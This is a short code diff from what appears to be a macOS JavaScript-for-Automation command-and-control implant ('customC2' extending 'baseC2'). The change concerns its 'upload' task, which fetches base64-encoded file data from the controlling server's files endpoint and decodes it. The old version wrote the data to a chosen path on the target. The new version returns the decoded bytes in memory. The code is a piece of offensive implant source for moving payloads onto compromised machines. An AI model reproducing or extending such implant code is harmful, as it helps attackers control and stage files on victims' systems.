@@ -141,14 +141,13 @@ class customC2 extends baseC2{
 	}
 	upload(task, params){
 	    try{
-	        var split_params = params.split(" ");
-            var url = "api/v1.0/files/" + split_params[0];
+	        var url = "api/v1.0/files/" + params;
             var file_data = this.htmlGetData(this.baseurl + url);
-            var file_path = split_params.slice(1, ).join(" ");
             var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
             //var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
-            var output = write_data_to_file(decoded_data, file_path);
-            return output;
+            return decoded_data;
+            //var output = write_data_to_file(decoded_data, file_path);
+            //return output;
 	    }catch(error){
 	        return error.toString();
 	    }
